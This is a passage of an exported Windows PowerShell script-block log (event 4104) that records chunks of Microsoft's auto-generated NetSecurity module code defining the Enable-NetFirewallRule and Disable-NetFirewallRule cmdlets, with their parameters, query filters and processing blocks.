          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodPa

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (19 of 19):
     {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EdgeTraversalPolicy})
        $__cmdletization_queryBuilder.FilterByProperty('EdgeTraversalPolicy', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LooseSourceMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LooseSourceMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LooseSourceMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalOnlyMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalOnlyMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LocalOnlyMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Owner') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Owner})
        $__cmdletization_queryBuilder.FilterByProperty('Owner', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyAppId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyAppId})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyAppId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PackageFamilyName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PackageFamilyName})
        $__cmdletization_queryBuilder.FilterByProperty('PackageFamilyName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetFirewallRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallApplicationFilter') -and (@('ByAssociatedNetFirewallApplicationFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallApplicationFilter}, 'MSFT_NetFirewallRuleFilterByApplication', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetFirewallRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallSecurityFilter') -and (@('ByAssociatedNetFirewallSecurityFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallSecurityFilter}, 'MSFT_NetFirewallRuleFilterBySecurity', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallServiceFilter') -and (@('ByAssociatedNetFirewallServiceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallServiceFilter}, 'MSFT_NetFirewallRuleFilterByService', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetFirewallRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetFirewallRule' -Alias '*'
        


ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (18 of 19):
      }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetFirewallRule' -Alias '*'
        

function Disable-NetFirewallRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal[]]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('LSM')]
    [ValidateNotNull()]
    [bool[]]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Owner},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallApplicationFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallSecurityFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallServiceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
   

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (17 of 19):
rameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EdgeTraversalPolicy})
        $__cmdletization_queryBuilder.FilterByProperty('EdgeTraversalPolicy', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LooseSourceMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LooseSourceMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LooseSourceMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalOnlyMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalOnlyMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LocalOnlyMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Owner') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Owner})
        $__cmdletization_queryBuilder.FilterByProperty('Owner', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
